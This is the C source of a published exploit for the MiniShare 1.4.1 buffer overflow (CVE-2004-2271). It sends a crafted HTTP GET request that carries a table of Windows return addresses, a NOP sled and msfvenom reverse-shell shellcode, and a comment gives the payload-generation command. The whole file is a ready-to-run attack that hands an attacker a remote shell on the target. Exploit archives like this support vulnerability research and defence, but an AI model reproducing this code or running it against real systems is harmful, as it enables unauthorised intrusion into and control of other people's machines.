/*
 * Exploit Title: Minishare 1.4.1 RCE exploit
 * Date: 17th of April of 2019
 * Exploit Author: Victor Vigel Flores
 * Vendor Homepage: https://sourceforge.net/projects/minishare/
 * Software Link: https://sourceforge.net/projects/minishare/
 * Version: 1.4.1
 * Tested on: Microsoft Windows 2000 ~ XP-SP3
 * CVE : 2004-2271
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include <unistd.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#include <assert.h>

#define SA      struct sockaddr
#define SA_IN   struct sockaddr_in

#define BUFF_ERR_LENGTH     1787
#define PAYLOAD_LENGTH      2500

#define GET                 "GET "
#define HTTP                " HTTP/1.1\r\n\r\n"

void generate_random_text(char * str, size_t size);
char * mount_payload(const int target);
int createSocket (const char * target, const int port);

/*
 * msfvenom -p windows/shell_reverse_tcp LHOST=X.X.X.X LPORT=1337
 * EXITFUNC=thread -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x40"
 * -f c -v payload
 */
unsigned char pload[] =
"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\xb7\xa7\xaa\x94\x83\xee\xfc\xe2\xf4\x4b\x4f\x28\x94\xb7\xa7"
"\xca\x1d\x52\x96\x6a\xf0\x3c\xf7\x9a\x1f\xe5\xab\x21\xc6\xa3"
"\x2c\xd8\xbc\xb8\x10\xe0\xb2\x86\x58\x06\xa8\xd6\xdb\xa8\xb8"
"\x97\x66\x65\x99\xb6\x60\x48\x66\xe5\xf0\x21\xc6\xa7\x2c\xe0"
"\xa8\x3c\xeb\xbb\xec\x54\xef\xab\x45\xe6\x2c\xf3\xb4\xb6\x74"
"\x21\xdd\xaf\x44\x90\xdd\x3c\x93\x21\x95\x61\x96\x55\x38\x76"
"\x68\xa7\x95\x70\x9f\x4a\xe1\x41\xa4\xd7\x6c\x8c\xda\x8e\xe1"
"\x53\xff\x21\xcc\x93\xa6\x79\xf2\x3c\xab\xe1\x1f\xef\xbb\xab"
"\x47\x3c\xa3\x21\x95\x67\x2e\xee\xb0\x93\xfc\xf1\xf5\xee\xfd"
"\xfb\x6b\x57\xf8\xf5\xce\x3c\xb5\x41\x19\xea\xcf\x99\xa6\xb7"
"\xa7\xc2\xe3\xc4\x95\xf5\xc0\xdf\xeb\xdd\xb2\xb0\x58\x7f\x2c"
"\x27\xa6\xaa\x94\x9e\x63\xfe\xc4\xdf\x8e\x2a\xff\xb7\x58\x7f"
"\xc4\xe7\xf7\xfa\xd4\xe7\xe7\xfa\xfc\x5d\xa8\x75\x74\x48\x72"
"\x3d\xfe\xb2\xcf\xa0\x9f\xb7\xfb\xc2\x96\xb7\xa2\x93\x1d\x51"
"\xcd\xba\xc2\xe0\xcf\x33\x31\xc3\xc6\x55\x41\x32\x67\xde\x98"
"\x48\xe9\xa2\xe1\x5b\xcf\x5a\x21\x15\xf1\x55\x41\xdf\xc4\xc7"
"\xf0\xb7\x2e\x49\xc3\xe0\xf0\x9b\x62\xdd\xb5\xf3\xc2\x55\x5a"
"\xcc\x53\xf3\x83\x96\x95\xb6\x2a\xee\xb0\xa7\x61\xaa\xd0\xe3"
"\xf7\xfc\xc2\xe1\xe1\xfc\xda\xe1\xf1\xf9\xc2\xdf\xde\x66\xab"
"\x31\x58\x7f\x1d\x57\xe9\xfc\xd2\x48\x97\xc2\x9c\x30\xba\xca"
"\x6b\x62\x1c\x4a\x89\x9d\xad\xc2\x32\x22\x1a\x37\x6b\x62\x9b"
"\xac\xe8\xbd\x27\x51\x74\xc2\xa2\x11\xd3\xa4\xd5\xc5\xfe\xb7"
"\xf4\x55\x41";

const char nops[] =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90";


const char * targets[] = {
    "\xab\xa3\x54\x77",            // Windows 2000 SP0->SP3 English */
    "\x64\xf1\x17\x75",            // Windows 2000 SP4 English */
    "\x54\x1d\xab\x71",            // Windows XP SP0-SP1 English */
    "\x72\x93\xab\x71",            // Windows XP SP2 English */
    "\x4d\x3c\xc0\x71",            // Windows 2003 SP0 English */
    "\x80\x36\x40\x77",            // Windows 2003 SP1 English */
    "\x80\x26\x40\x77",            // Windows 2003 SP2 English */
    "\xf8\x29\xf3\x77",            // Windows NT 4.0 SP6 */
    "\x0a\xaf\xd5\x77",            // Windows XP SP2 German */
    "\x6e\xe2\xd4\x77",            // Windows XP SP2 Polish */
    "\x0a\xaf\xd5\x77",            // Windows XP SP2 French */
    "\x53\x93\x3a\x7e"             // Windows XP SP3 French */
};

int
createSocket(const char * target, const int port) {
    int sockfd = socket (AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror ("unable to create socket");
        exit(EXIT_FAILURE);
    }

    SA_IN hostaddr;
    bzero(&hostaddr, sizeof(hostaddr));
    hostaddr.sin_family = AF_INET;
    hostaddr.sin_addr.s_addr = inet_addr (target);
    hostaddr.sin_port = htons (port);

    if (connect (sockfd, (SA *)&hostaddr, sizeof (hostaddr)) != 0) {
        perror ("trying to reach the target");
        exit(EXIT_FAILURE);
    }
    return sockfd;
}

void
generate_random_text(char * str, size_t size) {
    const char alphabet[] = "ABCDEFGHIJKLMNOPQRSTUVXWYZabcdefghijklmnopqrstuvxwyz";

    srand(time(NULL));
    for (size_t i = 0; i < size; i++) {
        str[i] = alphabet[rand() % strlen(alphabet)];
    }
    str[size] = 0x00;
}

char *
mount_payload (const int target) {
    if (target < 0 || target > 11) {
        fprintf (stderr, "Invalid OS target [!!]\n");
        exit (EXIT_FAILURE);
    }

    char * payload = (char *) calloc (PAYLOAD_LENGTH, sizeof (char));
    char rand_text[BUFF_ERR_LENGTH];
    generate_random_text (rand_text, BUFF_ERR_LENGTH);
    sprintf(payload, "%s%s%s%s%s", GET, rand_text, targets[target], nops, pload);

    int len = strlen(payload);
    int remain = PAYLOAD_LENGTH - len - 13;

    for (int i = 0; i < remain; i++) {
        payload[(len)+i] = 'B';
    }

    strncat (payload, HTTP, PAYLOAD_LENGTH);

    return payload;
}

int
main(int argc, char ** argv) {

    if (argc < 4) {
        printf ("Usage: %s <target_address> <target_port> <target_OS>\n", argv[0]);
        exit (EXIT_SUCCESS);
    }
    char * payload = mount_payload (atoi(argv[3]));
    int sockfd = createSocket (argv[1], atoi(argv[2]));

    write (sockfd, payload, strlen(payload));

    free (payload);
    close(sockfd);

    return 0;
}
